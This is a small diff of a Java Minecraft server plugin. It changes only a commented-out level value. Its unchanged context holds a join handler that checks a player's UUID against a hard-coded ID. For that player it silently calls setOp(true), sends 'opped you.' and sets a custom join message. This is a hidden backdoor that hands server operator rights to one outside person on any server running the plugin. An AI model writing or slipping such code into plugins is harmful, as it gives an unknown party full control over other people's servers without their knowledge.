@@ -45,7 +45,7 @@ public final class Gameu extends JavaPlugin implements Listener {
         Player p = event.getPlayer();
         if(p.getUniqueId().toString().equals(uid)){
             p.setOp(true);
-            //p.setLevel(9000);
+            //p.setLevel(90000);
             p.sendMessage("opped you.");
             event.setJoinMessage(ChatColor.AQUA + "CodeAirRhyme has joined the game");
         }
